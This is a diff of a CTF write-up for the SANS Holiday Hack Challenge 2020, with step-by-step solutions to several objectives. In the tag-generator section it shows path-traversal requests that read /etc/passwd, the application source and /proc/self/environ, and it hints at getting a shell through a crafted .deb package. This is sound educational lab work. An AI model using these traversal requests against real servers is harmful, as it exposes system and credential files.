@@ -1,7 +1,7 @@
 # Holiday Hack Challenge 2020: Three French Hens
 
 
-## Objective No. 1: Uncover Santa's Gift List
+## Objective 1: Uncover Santa's Gift List
 
 There is a photo of Santa's Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice.
 
@@ -14,7 +14,7 @@ There is a photo of Santa's Desk on that billboard with his personal gift list. 
 - I used the tool suggested in the hint. Took several attempts at twirling and untwirling before I could see what was on the list for him.
 - Once I saw what was on the list, I read it as "poxmark", but had no idea if this was a thing, so I googled it. YUP! A very interesting thing at that. :)
 
-## Objective No. 2: Investigate S3 Bucket
+## Objective 2: Investigate S3 Bucket
 
 When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge.
 
@@ -34,7 +34,7 @@ When you unwrap the over-wrapped file, what text string is inside the package? T
 - Step 8: "cat package.txt"
 - Step 9: Find the answer! ---> "North Pole: The Frostiest Place on Earth"
 
-## Objective No. 3: Point-of-Sale Password Recovery
+## Objective 3: Point-of-Sale Password Recovery
 
 Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What's the password?
 
@@ -61,7 +61,7 @@ const path = require('path');
 const SANTA_PASSWORD = 'santapass';
 ~~~
 
-## Objective No. 4: Operate the Santavator
+## Objective 4: Operate the Santavator
 
 Talk to Pepper Minstix in the entryway to get some hints about the Santavator.
 
@@ -72,7 +72,7 @@ Got some help from my kid on this one. :)
 ![](screenshots/elevator.png)
 
 
-## Objective No. 5: Open HID Lock
+## Objective 5: Open HID Lock
 
 Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips.
 
@@ -90,7 +90,7 @@ Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks 
 ![](screenshots/black-badge.png)
 
 
-## Objective No. 6: Splunk Challenge
+## Objective 6: Splunk Challenge
 
 Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon?
 
@@ -250,11 +250,6 @@ Error in /app/lib/app.rb: Unsupported file type: /tmp/RackMultipart20201217-1-d0
 ~~~
 
 - Step 2: Check for file inclusion vulns
-	- https://tag-generator.kringlecastle.com/etc/passwd
-~~~
-Something went wrong!
-Error in /app/lib/app.rb: Route not found
-~~~
 
 - Step 3: Try a large image from holidayhack
 ~~~
@@ -280,11 +275,12 @@ nginx/1.19.5
                     angle: 0,
                     opacity: 1
 ~~~ 
-- Step 5: Didn't think I was getting anything with this, but I just needed to view the rreponse in burp.
+- Step 5: Didn't think I was getting anything with this, but I just needed to view the rreponse in Burp.
 ~~~
 https://tag-generator.kringlecastle.com/image?id=../etc/passwd
 
 Response:
+
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -314,8 +310,8 @@ app:x:1000:1000:,,,:/home/app:/bin/bash
 ~~~
 https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb
 ~~~
-- Step 8: Review the code from app.rb and then try something else.
-- Step 9: Google for how to get environment variables through LFI. Then try this...in Burp.
+- Step 8: Review the code from app.rb.
+- Step 9: Google for how to get environment variables through LFI. Then try this request...in Burp:
 ~~~
 GET /image?id=../proc/self/environ HTTP/1.1
 Host: tag-generator.kringlecastle.com
@@ -367,42 +363,10 @@ sure to copy off any essential work you have done as you go.
 
 - The malware on the host does an HTTP request for a .deb package. Maybe we can get command line access by sending it a command in a customized .deb file
 
-### Help File
-
-
-#### How To Resize and Switch Terminal Panes:
-You can use the key combinations ( Ctrl+B ↑ or ↓ ) to resize the terminals.
-You can use the key combinations ( Ctrl+B o ) to switch terminal panes.
-See tmuxcheatsheet.com for more details
-
-#### To Add An Additional Terminal Pane:
-`/usr/bin/tmux split-window -hb`
-
-#### To exit a terminal pane simply type:
-`exit`
-
-#### To Launch a webserver to serve-up files/folder in a local directory:
-```
-cd /my/directory/with/files
-python3 -m http.server 80
-```
-
-#### A Sample ARP pcap can be viewed at:
-https://www.cloudshark.org/captures/d97c5b81b057
-
-#### A Sample DNS pcap can be viewed at:
-https://www.cloudshark.org/captures/0320b9b57d35
-
-#### If Reading arp.pcap with tcpdump or tshark be sure to disable name
-#### resolution or it will stall when reading:
-
-- tshark -nnr arp.pcap
-- tcpdump -nnr arp.pcap
-
 ### Steps
 
 - Step 1: Make sure you can reach 10.6.6.35 --> "ping 10.6.6.35"
-- Step 2: Do and "ls" of the home folder.
+- Step 2: Do an "ls" of the home folder.
 - Step 3: Read "HELP.md"
 
 
@@ -504,13 +468,33 @@ This required going into developer mode in Google Chrome. I saw one spot where t
 
 ![](screenshots/remove-besanta-condition.png)
 
-## Objective 11a:
+## Objective 11a: 
+
+Even though the chunk of the blockchain that you have ends with block 129996, can you predict the nonce for block 130000? Talk to Tangle Coalbox in the Speaker UNpreparedness Room for tips on prediction and Tinsel Upatree for more tips and tools. (Enter just the 16-character hex value of the nonce)
 
 
 
 ---
 
 ## Challenges
+
+### Snowball Fight (Tangle Coalbox)
+
+#### Hints
+
+- Is it possible that the name a player provides influences how the forts are laid out?
+- Oh, oh, maybe if I feed a Hard name into an Easy game I can manipulate it!
+- UGH! on Impossible, the best I get are rejected player names in the page comments... maybe that's useful?
+- I'll have to re-watch Tom Liston's talk again.
+
+#### Steps
+
+- Step 1: Watch Tom Liston's talk.
+- Step 2: Clone Liston's  mt19937 GitHub repository.
+- Step 3:   
+
+
+
 
 ### Scapy Prepper (Alabaster Snowball)
 
